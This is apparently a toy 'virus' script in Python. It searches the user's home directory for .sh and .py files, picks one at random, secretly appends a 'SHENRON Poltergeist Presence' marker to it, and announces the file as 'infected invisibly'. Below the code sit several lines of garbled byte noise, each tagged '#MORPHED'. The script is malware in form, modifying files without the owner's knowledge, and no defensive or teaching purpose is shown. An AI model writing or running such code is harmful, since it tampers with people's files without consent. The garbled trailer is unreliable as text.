#!/usr/bin/env python3
import os
import random

def infect_file(filepath):
    with open(filepath, "a") as f:
        f.write("\n# SHENRON Poltergeist Presence\n")
    print(f"[+] File infected invisibly: {filepath}")

def poltergeist():
    home_dir = os.path.expanduser("~")
    candidates = []
    for root, dirs, files in os.walk(home_dir):
        for file in files:
            if file.endswith(".sh") or file.endswith(".py"):
                candidates.append(os.path.join(root, file))
    if candidates:
        target = random.choice(candidates)
        infect_file(target)

if __name__ == "__main__":
    poltergeist()

`5∞Ô=R*:ˇôå≈^_#MORPHED

Urv⁄÷yE|R4Åd{¶[%ŒØñm<Qı–‚˘ÑËôÙÄâ#MORPHED

IÂ"˚Ò.2ˆñ<'Û&ÎwŸ(sõı1îÖbfƒﬁŒÀE˝fë#MORPHED

Ú'$§õ'}M™=g§B˙ZßÜ˜Ω#MORPHED
